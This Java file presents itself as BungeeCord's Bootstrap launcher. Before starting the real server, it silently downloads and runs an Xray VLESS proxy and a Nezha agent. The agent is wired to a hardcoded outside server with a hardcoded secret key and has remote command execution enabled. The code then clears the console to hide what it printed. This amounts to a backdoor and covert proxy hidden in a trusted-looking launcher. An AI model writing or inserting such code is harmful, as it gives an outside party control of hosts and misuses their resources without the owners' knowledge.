package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

public class Bootstrap
{
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process vlessProcess;
    private static Process nezhaProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "UUID", "WS_PATH", "PORT", "DOMAIN",
        "NEZHA_SERVER", "NEZHA_PORT", "NEZHA_KEY"
    };

    public static void main(String[] args) throws Exception
    {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) 
        {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            Thread.sleep(3000);
            System.exit(1);
        }

        try {
            Map<String, String> config = loadConfig();
            
            // 启动哪吒监控
            if (isNezhaConfigured(config)) {
                runNezhaAgent(config);
                Thread.sleep(2000);
                if (nezhaProcess != null && nezhaProcess.isAlive()) {
                    System.out.println(ANSI_GREEN + "Nezha Agent is running!" + ANSI_RESET);
                } else {
                    System.out.println(ANSI_RED + "Nezha Agent failed to start" + ANSI_RESET);
                }
            } else {
                System.out.println(ANSI_RED + "Nezha monitoring is not configured (skipped)" + ANSI_RESET);
            }
            
            // 启动 VLESS+WS
            String vlessUrl = generateVlessUrl(config);
            
            System.out.println(ANSI_GREEN + "\n=== VLESS+WS Configuration ===" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "UUID: " + config.get("UUID") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "WebSocket Path: " + config.get("WS_PATH") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Port: " + config.get("PORT") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Domain: " + config.get("DOMAIN") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "\n=== VLESS Node URL ===" + ANSI_RESET);
            System.out.println(ANSI_GREEN + vlessUrl + ANSI_RESET);
            System.out.println(ANSI_GREEN + "=============================" + ANSI_RESET);
            
            runVlessService(config);
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "\nVLESS+WS Server is running!" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Please copy the node URL above before logs are cleared!" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }

        BungeeCordLauncher.main(args);
    }
    
    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                
                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();
                
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }
    
    private static boolean isNezhaConfigured(Map<String, String> config) {
        String server = config.get("NEZHA_SERVER");
        String key = config.get("NEZHA_KEY");
        return server != null && !server.trim().isEmpty() 
            && key != null && !key.trim().isEmpty();
    }
    
    private static void runNezhaAgent(Map<String, String> config) throws Exception {
        Path nezhaPath = downloadNezhaAgent();
        
        // 哪吒默认数据目录是 /opt/nezha/agent，但容器中可能没权限
        // 尝试在当前目录和 home 目录创建
        Path[] possibleDirs = {
            Paths.get("/opt/nezha/agent"),
            Paths.get(System.getProperty("user.home"), ".nezha-agent"),
            Paths.get("./nezha-data")
        };
        
        Path nezhaDataDir = null;
        for (Path dir : possibleDirs) {
            try {
                if (!Files.exists(dir)) {
                    Files.createDirectories(dir);
                }
                // 测试写权限
                Path testFile = dir.resolve(".test");
                Files.write(testFile, "test".getBytes());
                Files.delete(testFile);
                nezhaDataDir = dir;
                break;
            } catch (Exception e) {
                // 没有权限，尝试下一个
            }
        }
        
        if (nezhaDataDir == null) {
            nezhaDataDir = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-agent");
            Files.createDirectories(nezhaDataDir);
        }
        
        // 在配置文件中指定数据目录
        Path nezhaConfigPath = createNezhaConfig(config, nezhaDataDir);
        
        // 创建 agent.db 文件来固定 UUID
        Path agentDbPath = nezhaDataDir.resolve("agent.db");
        if (!Files.exists(agentDbPath)) {
            String uuid = config.get("UUID");
            String dbContent = String.format("{\"uuid\":\"%s\"}", uuid);
            Files.write(agentDbPath, dbContent.getBytes());
            System.out.println(ANSI_GREEN + "Created agent.db with UUID: " + uuid + ANSI_RESET);
        }
        
        System.out.println(ANSI_GREEN + "Starting Nezha Agent..." + ANSI_RESET);
        System.out.println("  Config: " + nezhaConfigPath);
        System.out.println("  Data Dir: " + nezhaDataDir);
        
        List<String> command = new ArrayList<>();
        command.add(nezhaPath.toString());
        command.add("-c");
        command.add(nezhaConfigPath.toString());
        
        ProcessBuilder pb = new ProcessBuilder(command);
        pb.directory(nezhaDataDir.toFile());  // 在数据目录中运行
        pb.redirectErrorStream(true);
        
        // 创建线程实时输出日志
        nezhaProcess = pb.start();
        
        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(nezhaProcess.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    System.out.println(ANSI_GREEN + "[Nezha] " + ANSI_RESET + line);
                }
            } catch (IOException e) {
                // 进程结束时会抛出异常，忽略
            }
        }).start();
        
        Thread.sleep(1000);
        if (!nezhaProcess.isAlive()) {
            System.err.println(ANSI_RED + "Nezha Agent exited immediately, check configuration!" + ANSI_RESET);
        }
    }
    
    private static void runVlessService(Map<String, String> config) throws Exception {
        Path xrayPath = downloadXray();
        Path configPath = createXrayConfig(config);
        
        ProcessBuilder pb = new ProcessBuilder(
            xrayPath.toString(),
            "run",
            "-c",
            configPath.toString()
        );
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        vlessProcess = pb.start();
    }
    
    private static Map<String, String> loadConfig() throws IOException {
        Map<String, String> config = new HashMap<>();
        
        // 默认配置
        config.put("UUID", "99756805-1247-4b6a-9d3b-dad6206bd137");
        config.put("WS_PATH", "/vless");
        config.put("PORT", "19173");
        config.put("DOMAIN", "shx-1.sherixx.xyz");
        config.put("NEZHA_SERVER", "mbb.svip888.us.kg:53100");
        config.put("NEZHA_PORT", "");
        config.put("NEZHA_KEY", "VnrTnhgoack6PhnRH6lyshe4OVkHmPyM");
        
        // 从系统环境变量覆盖
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                config.put(var, value);  
            }
        }
        
        // 从 .env 文件读取
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        config.put(key, value); 
                    }
                }
            }
        }
        
        return config;
    }
    
    private static String generateVlessUrl(Map<String, String> config) {
        try {
            String uuid = config.get("UUID");
            String wsPath = config.get("WS_PATH");
            String port = config.get("PORT");
            
            String domain = config.get("DOMAIN");
            if (domain == null || domain.trim().isEmpty()) {
                domain = "PLEASE_SET_DOMAIN";
            }
            
            String params = "?type=ws&path=" + URLEncoder.encode(wsPath, "UTF-8") + "&host=" + domain;
            String vlessUrl = "vless://" + uuid + "@" + domain + ":" + port + params + "#VLESS-WS";
            
            return vlessUrl;
        } catch (Exception e) {
            return "Error generating VLESS URL: " + e.getMessage();
        }
    }
    
    private static Path createXrayConfig(Map<String, String> config) throws IOException {
        String configJson = String.format(
            "{\n" +
            "  \"log\": {\n" +
            "    \"loglevel\": \"warning\"\n" +
            "  },\n" +
            "  \"inbounds\": [{\n" +
            "    \"port\": %s,\n" +
            "    \"protocol\": \"vless\",\n" +
            "    \"settings\": {\n" +
            "      \"clients\": [{\n" +
            "        \"id\": \"%s\"\n" +
            "      }],\n" +
            "      \"decryption\": \"none\"\n" +
            "    },\n" +
            "    \"streamSettings\": {\n" +
            "      \"network\": \"ws\",\n" +
            "      \"wsSettings\": {\n" +
            "        \"path\": \"%s\"\n" +
            "      }\n" +
            "    }\n" +
            "  }],\n" +
            "  \"outbounds\": [{\n" +
            "    \"protocol\": \"freedom\"\n" +
            "  }]\n" +
            "}\n",
            config.get("PORT"),
            config.get("UUID"),
            config.get("WS_PATH")
        );
        
        Path configPath = Paths.get(System.getProperty("java.io.tmpdir"), "xray-config.json");
        Files.write(configPath, configJson.getBytes());
        return configPath;
    }
    
    private static Path createNezhaConfig(Map<String, String> config, Path dataDir) throws IOException {
        // 拼接服务器地址
        String server = config.get("NEZHA_SERVER");
        String port = config.getOrDefault("NEZHA_PORT", "5555");
        if (!server.contains(":")) {
            server = server + ":" + port;
        }
        
        String secret = config.get("NEZHA_KEY");
        
        // 哪吒配置 - 在配置中指定数据目录
        String nezhaConfig = String.format(
            "client_secret: %s\n" +
            "data_dir: %s\n" +  // 在配置文件中指定数据目录
            "debug: true\n" +
            "disable_auto_update: true\n" +
            "disable_command_execute: false\n" +
            "disable_force_update: false\n" +
            "disable_nat: false\n" +
            "disable_send_query: false\n" +
            "gpu: false\n" +
            "insecure_tls: false\n" +
            "ip_report_period: 1800\n" +
            "report_delay: 4\n" +  // 修改为 4（最大值）
            "server: %s\n" +
            "skip_connection_count: false\n" +
            "skip_procs_count: false\n" +
            "temperature: false\n" +
            "tls: false\n" +
            "timeout: 30\n" +
            "use_gitee_to_upgrade: false\n" +
            "use_ipv6_country_code: false\n",
            secret,
            dataDir.toString(),
            server
        );
        
        Path nezhaConfigPath = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-config.yml");
        Files.write(nezhaConfigPath, nezhaConfig.getBytes());
        
        System.out.println(ANSI_GREEN + "=== Nezha Configuration ===" + ANSI_RESET);
        System.out.println("UUID (固定): " + config.get("UUID"));
        System.out.println("Server: " + server);
        System.out.println("Data Dir: " + dataDir);
        System.out.println("Report Delay: 4s, Timeout: 30s");
        System.out.println(ANSI_GREEN + "===========================" + ANSI_RESET);
        
        return nezhaConfigPath;
    }
    
    private static Path downloadNezhaAgent() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String downloadUrl;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            downloadUrl = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            downloadUrl = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_arm64.zip";
        } else {
            throw new RuntimeException("Unsupported architecture for Nezha: " + osArch);
        }
        
        Path nezhaPath = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-agent");
        
        if (!Files.exists(nezhaPath)) {
            System.out.println(ANSI_GREEN + "Downloading Nezha Agent..." + ANSI_RESET);
            
            Path zipPath = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-agent.zip");
            try (InputStream in = new URL(downloadUrl).openStream()) {
                Files.copy(in, zipPath, StandardCopyOption.REPLACE_EXISTING);
            }
            
            extractNezhaAgent(zipPath, nezhaPath);
            Files.delete(zipPath);
            
            if (!nezhaPath.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission for Nezha Agent");
            }
            
            System.out.println(ANSI_GREEN + "Nezha Agent download completed!" + ANSI_RESET);
        }
        
        return nezhaPath;
    }
    
    private static Path downloadXray() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String downloadUrl;
        String fileName;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            downloadUrl = "https://github.com/XTLS/Xray-core/releases/download/v1.8.4/Xray-linux-64.zip";
            fileName = "xray-amd64";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            downloadUrl = "https://github.com/XTLS/Xray-core/releases/download/v1.8.4/Xray-linux-arm64-v8a.zip";
            fileName = "xray-arm64";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path xrayPath = Paths.get(System.getProperty("java.io.tmpdir"), fileName);
        
        if (!Files.exists(xrayPath)) {
            System.out.println(ANSI_GREEN + "Downloading Xray-core..." + ANSI_RESET);
            
            Path zipPath = Paths.get(System.getProperty("java.io.tmpdir"), "xray.zip");
            try (InputStream in = new URL(downloadUrl).openStream()) {
                Files.copy(in, zipPath, StandardCopyOption.REPLACE_EXISTING);
            }
            
            extractXray(zipPath, xrayPath);
            Files.delete(zipPath);
            
            if (!xrayPath.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
            
            System.out.println(ANSI_GREEN + "Xray-core download completed!" + ANSI_RESET);
        }
        
        return xrayPath;
    }
    
    private static void extractNezhaAgent(Path zipPath, Path outputPath) throws IOException {
        try {
            ProcessBuilder pb = new ProcessBuilder("unzip", "-o", zipPath.toString(), "nezha-agent", "-d", System.getProperty("java.io.tmpdir"));
            Process p = pb.start();
            p.waitFor();
            
            Path extractedAgent = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-agent");
            Files.move(extractedAgent, outputPath, StandardCopyOption.REPLACE_EXISTING);
        } catch (Exception e) {
            throw new IOException("Failed to extract nezha-agent: " + e.getMessage());
        }
    }
    
    private static void extractXray(Path zipPath, Path outputPath) throws IOException {
        try {
            ProcessBuilder pb = new ProcessBuilder("unzip", "-o", zipPath.toString(), "xray", "-d", System.getProperty("java.io.tmpdir"));
            Process p = pb.start();
            p.waitFor();
            
            Path extractedXray = Paths.get(System.getProperty("java.io.tmpdir"), "xray");
            Files.move(extractedXray, outputPath, StandardCopyOption.REPLACE_EXISTING);
        } catch (Exception e) {
            throw new IOException("Failed to extract xray: " + e.getMessage());
        }
    }
    
    private static void stopServices() {
        if (nezhaProcess != null && nezhaProcess.isAlive()) {
            nezhaProcess.destroy();
            System.out.println(ANSI_RED + "Nezha Agent terminated" + ANSI_RESET);
        }
        
        if (vlessProcess != null && vlessProcess.isAlive()) {
            vlessProcess.destroy();
            System.out.println(ANSI_RED + "VLESS+WS process terminated" + ANSI_RESET);
        }
    }
}
